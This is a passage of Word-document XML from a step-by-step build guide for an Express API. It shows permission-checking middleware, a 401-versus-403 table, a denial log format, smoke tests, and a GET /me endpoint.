              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      return next(errors.unauthorized());</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const owned = new Set(req.user.permissions);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!permissions.some(p =&gt; owned.has(p))) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      return next(errors.forbidden(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        `Missing any of required permissions: ${permissions.join(', ')}`));</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return next();</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module.exports = authorize;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>module.exports.authorizeAny = authorizeAny;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>5.3  The 401 vs 403 Distinction</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
        <w:gridCol w:w="3400"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>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HTTP code</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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Meaning</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="3685"/>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FE response in axios interceptor</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1984"/>
            <w:tcBorders>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:left w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40" w:after="40"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="19"/>
              </w:rPr>
              <w:t>401 UNAUTHORIZED</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You are not authenticated (missing/expired/invalid token).</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Trigger silent /auth/refresh, retry once. If refresh fails → bounce to /login.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="198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403 FORBIDDEN</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You are authenticated but lack a required permission.</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Do NOT retry refresh (would loop). Render Forbidden page in place.</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EEF2FF"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="4F5DFF"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">INFO  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why conflating them would loop forever</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>If a 403 triggered refresh, the new access token still wouldn't have the permission → another 403 → another refresh → DDoS your own backend.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Every authorize() denial is therefore strictly 403. Every authenticate() denial is strictly 401.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>5.4  Forensics — Every Denial Emits a warn Line</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>authorize logs the requested permission, the authenticated employee_id, the user's role, and the path. Sustained 403s from one user mean either (a) the FE rendered an action it shouldn't have, or (b) someone is probing for excess privilege. Both are worth investigating.</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log line shape</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>{</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "level": "warn",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "permission": "user:read-list",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "employeeId": "DS00001",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "role": "NORMAL_USER",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "permissionCount": 13,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "path": "/api/v1/admin/users",</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  "msg": "Permission denied"</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>5.5  STEP 4 Verification</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>authorize has no gated endpoint yet (those land in STEP 5 + STEP 8). The factory itself was smoke-tested out-of-band:</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// Build-time validation</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>authorize('');               // → throws at module load</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>authorizeAny();              // → throws at module load</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Runtime FORBIDDEN</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>mw({user:{permissions:['other:thing'],employeeId:'DS00001',role:'NORMAL_USER'},log:{warn(){}}}, {}, fn);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// → fn(AppError('FORBIDDEN'))</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Runtime UNAUTHORIZED (missing req.user)</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>mw({log:{warn(){}}}, {}, fn);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>// → fn(AppError('UNAUTHORIZED'))</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="left"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="10200"/>
      </w:tblGrid>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="10200"/>
            <w:shd w:val="clear" w:color="auto" w:fill="DCFCE7"/>
            <w:tcBorders>
              <w:left w:val="single" w:sz="24" w:color="16A34A"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="16A34A"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">VERIFIED  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>STEP 4 acceptance</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>authorize('x') returns a function.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>authorize('') throws at module load (fail-fast misconfig).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>FORBIDDEN branch fires when permission missing.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>UNAUTHORIZED branch fires when req.user absent (defensive coverage).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part VI  ·  STEP 5  ·  Users Module (GET /me)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The smallest step. One controller + one router + an app.use line. GET /me returns the authenticated user's identity and permission set — used by the frontend to hydrate after a page reload.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>6.1  users.controller.js</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src/modules/users/users.controller.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>async function getMe(req, res) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!req.user) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return res.status(500).json({ error: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      code: 'INTERNAL',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      message: 'authenticate middleware did not populate req.user',</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      details: null }});</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return res.json({ data: {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    employeeId: req.user.employeeId,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    userId:     req.user.userId,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    role:       req.user.role,</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    permissions: req.user.permissions,</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t>module.exports = { getMe };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>6.2  users.routes.js</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src/modules/users/users.routes.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>'use strict';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const express = require('express');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const authenticate = require('../../middleware/authenticate');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const { getMe } = require('./users.controller');</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const router = express.Router();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>router.get('/me', authenticate, getMe);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>module.exports = router;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>6.3  server.js mount</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src/server.js</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>const usersRoutes = require('./modules/users/users.routes');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>app.use(`${env.API_BASE_PATH}`, usersRoutes);   // → /api/v1/me</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>6.4  Why /me Does Not Hit the Database</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>authenticate.js already decoded the JWT into req.user. Everything /me returns is in that object. A DB round-trip per call would be 100% redundant — and /me is one of the most frequently called endpoints (every page reload). If we later need to enrich it with server-side state (profile photo, last_login_at), we add a users.repo.findProfile() then — not preemptively.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>6.5  STEP 5 Verification</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bash</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t># Without token → 401</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
